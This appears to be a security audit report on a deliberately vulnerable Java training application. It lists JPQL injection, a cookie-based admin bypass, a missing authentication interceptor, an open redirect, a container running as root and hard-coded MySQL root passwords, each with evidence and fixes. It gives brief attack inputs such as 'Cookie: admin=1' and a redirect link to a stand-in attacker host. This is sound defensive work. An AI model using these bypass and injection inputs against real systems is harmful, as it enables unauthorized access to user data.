title: Raw exception message from a database query is returned to the client on the user-search form
evidence: In UserAction.search() (line 109) `userService.findByLoginUnsafe(getLogin())` is called; UserService.findByLoginUnsafe (UserService.java:74-75) builds the JPQL query by string-concatenating the raw login parameter (`"SELECT u FROM User u WHERE u.login = '" + login + "'"`) with no escaping, so a login value containing a quote throws a query-syntax exception. That exception's message is caught here and passed verbatim to addActionError(), and UserSearch.jsp:17 renders it directly to the browser via `<s:actionerror theme="bootstrap"/>`, which is present on the same userSearch view the search() method returns to.
impact: An attacker who submits a login value containing a quote or other JPQL metacharacter receives the backend's raw query-parser error text in the HTTP response, disclosing the internal query shape and confirming the injectable concatenation point.
fix: Catch the exception, log the detail server-side with a correlation id, and return a generic user-facing message such as "Search failed, please try again"; separately, fix findByLoginUnsafe to use a parameterized query as findByLogin already does.

title: Admin user-list API trusts a client-supplied cookie instead of a server-side authorization check
evidence: adminShowUsers() (ApiAction.java:35-65) grants access purely by checking whether the incoming request carries a cookie literally named `admin` with value `1`; this cookie is entirely attacker-controlled (any HTTP client can set arbitrary request cookies) and is never set or signed by server-side login code (grep of the whole tree shows no code that sets a cookie named `admin`, and Login.java's authenticate() only writes to the HTTP session, never to a cookie). If isAdmin is true, the method dumps every user's id, login, email and role via userService.findAllUsers() and returns it as JSON (renderJSON at line 64).
impact: Any unauthenticated remote client can send `Cookie: admin=1` to /api/userList.action and receive the full user directory (id, login, email, role) for every account in the system.
fix: Remove the cookie check entirely and authorize by the same server-side session/role state the rest of the app uses (e.g. check sessionGetUser().getRole() from BaseController), gated by an interceptor as described in platform-007.

title: The /api Struts package has no authentication interceptor, so every action in it runs unauthenticated
snippet:
<package name="api" namespace="/api" extends="struts-default">
    <action name="ping" class="com.appsecco.dvja.controllers.ApiAction" method="ping"></action>
    <action name="userList" class="com.appsecco.dvja.controllers.ApiAction" method="adminShowUsers"></action>
</package>
evidence: Every action in the `default` package that is meant to require login explicitly adds `<interceptor-ref name="authenticationStack"/>` (e.g. struts.xml:47, 52, 57, 63, 69, 75, 80, ...). This `api` package extends only the bare `struts-default` and adds no interceptor-ref at all, so neither `ping` nor `userList` (which calls the admin-only adminShowUsers, see platform-006) go through AuthenticationInterceptor's session check (AuthenticationInterceptor.java:15-22).
impact: Any action placed in this package bypasses the application's login requirement by construction; combined with platform-006 it lets an unauthenticated client dump the full user list, and it means any future action added to this package inherits no authentication by default.
fix: Add `<interceptor-ref name="authenticationStack"/>` to the api package (or each action in it) and additionally enforce a server-side admin-role check for userList, matching the fix in platform-006.

title: Open redirect: the redirect action forwards to an attacker-supplied URL with no validation
evidence: RedirectAction.execute() (RedirectAction.java:17-22) only checks that the `url` request parameter is non-empty (`if(!StringUtils.isEmpty(getUrl())) return "redirect";`) and performs no allowlist, same-origin or scheme check. struts.xml then interpolates that same attacker-controlled `url` field straight into a `type="redirect"` result (`${url}`), which Struts2 sends as the Location header of an HTTP redirect.
impact: An attacker can craft a link such as /redirect.action?url=https://evil.example and have victims redirected from a trusted domain to an attacker-controlled site, aiding phishing or credential-harvesting.
fix: Validate `url` against an allowlist of known-safe internal paths (or require it to be a relative path with no scheme/host) before returning the redirect result.

title: Application container has no USER directive and runs as root
evidence: I read the full Dockerfile (17 lines): it starts FROM openjdk:8, installs packages, builds the app and runs this CMD, with no `USER` instruction anywhere in the file. Docker defaults to root when no USER is set, so the mvn jetty:run process launched by scripts/start.sh (and therefore the whole servlet container serving this app) runs as root inside the container.
impact: Any code-execution vulnerability reached through the application (for example via platform-001's devMode OGNL console) runs with root privileges inside the container, widening the blast radius of container escape or further host-level attacks.
fix: Create an unprivileged user in the Dockerfile and switch to it with a USER instruction before the CMD.

title: MySQL root password hard-coded in committed docker-compose.yml (mysql service)
evidence: docker-compose.yml sets the MySQL container's root password directly as a literal value in the `environment:` block for the `mysql` service (line 8). This is the value the official mysql:5.5 image uses to initialize the root account on first start, per the image's documented MYSQL_ROOT_PASSWORD variable. The file is committed to the repository (it is listed in target.json, not gitignored — .gitignore/.dockerignore were read and neither excludes it), so anyone with read access to the source tree has the live root credential for the database container this compose file starts.
impact: Anyone who can read the repository (the project is a public 'Damn Vulnerable Java Application' training repo) obtains the MySQL root password used by the running database container. Combined with any network path to the mysql service (e.g. from a compromised app container or a compose override that publishes 3306), this gives full read/write/DDL access to every table, including the `users` table with all account password hashes.
fix: Remove the literal password from docker-compose.yml; pass it via an untracked .env file referenced with `${MYSQL_ROOT_PASSWORD}` or a Docker secret, add that file to .gitignore, and rotate the current password since it is already exposed in git history.

title: MySQL root password hard-coded in committed docker-compose.yml (app service) and used by start.sh to run schema DDL as root
evidence: The `app` service's environment block passes the same literal value from line 8 as MYSQL_PASSWORD (line 17), paired with MYSQL_USER: root at line 16. scripts/start.sh (read) then uses these two env vars directly: `mysql -h mysql -u $MYSQL_USER -p$MYSQL_PASSWORD -e "CREATE DATABASE dvja ..."` (start.sh:6) and `mysql -h mysql -u $MYSQL_USER -p$MYSQL_PASSWORD dvja < ./db/schema.sql` (start.sh:7), so this literal is the credential the running app container actually authenticates to MySQL with as root to provision the database on every container start.
impact: The app container's root DB credential is committed in plaintext. Anyone with the repository, or anyone who can read the container's environment (e.g. via `docker inspect`, a misconfigured debug endpoint, or process listing since the password appears on the mysql command line), gets root access to the database backing the application.
fix: Source MYSQL_USER/MYSQL_PASSWORD from an untracked .env file or Docker secret instead of a literal in docker-compose.yml, use a dedicated low-privilege application account rather than root for start.sh's runtime queries, and rotate the exposed password.

title: MySQL root password hard-coded in the deployed application's config.properties and wired into the live Spring DataSource
evidence: config.properties (packaged inside WEB-INF, i.e. shipped in the deployed WAR) sets mysql.password to the literal value on line 4, alongside mysql.username=root on line 3. applicationContext.xml, read, loads this exact file via PropertyPlaceholderConfigurer (`<property name="location" value="/WEB-INF/config.properties" />`, line 15) and then builds the live DriverManagerDataSource bean with `<property name="password" value="${mysql.password}" />` (applicationContext.xml:22) and `<property name="username" value="${mysql.username}" />` (line 21). This is not a placeholder or a test fixture: it is the credential the running Spring application uses for every JDBC connection to the users/products tables.
impact: Anyone who can read the WAR/source (the repository, or a decompiled deployed artifact) recovers the live root database password for the application's own connection pool, giving full read/write access to all application data including the `users` table's password column.
fix: Externalize mysql.username/mysql.password to environment variables or a secrets manager injected at deploy time instead of shipping them inside the WAR's config.properties, use a least-privilege DB account instead of root, and rotate the exposed password.
